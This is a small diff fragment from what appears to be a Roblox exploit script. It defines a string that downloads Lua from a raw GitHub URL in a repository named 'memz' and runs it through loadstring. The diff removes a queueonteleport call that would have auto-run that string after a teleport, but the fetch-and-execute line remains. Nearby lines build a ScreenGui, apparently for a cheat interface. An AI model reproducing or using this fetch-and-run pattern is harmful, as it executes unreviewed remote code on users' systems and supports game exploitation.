@@ -58,7 +58,6 @@ local TELEPORT_SCRIPT = [[
     local teleportScript = [[
         loadstring(game:HttpGet('https://raw.githubusercontent.com/P996Lazer69/memz/main/lol.lua'))()
     ]]
-    queueonteleport(teleportScript)
 
 local function RUN_SCRIPT()
     local lolxd = Instance.new("ScreenGui")
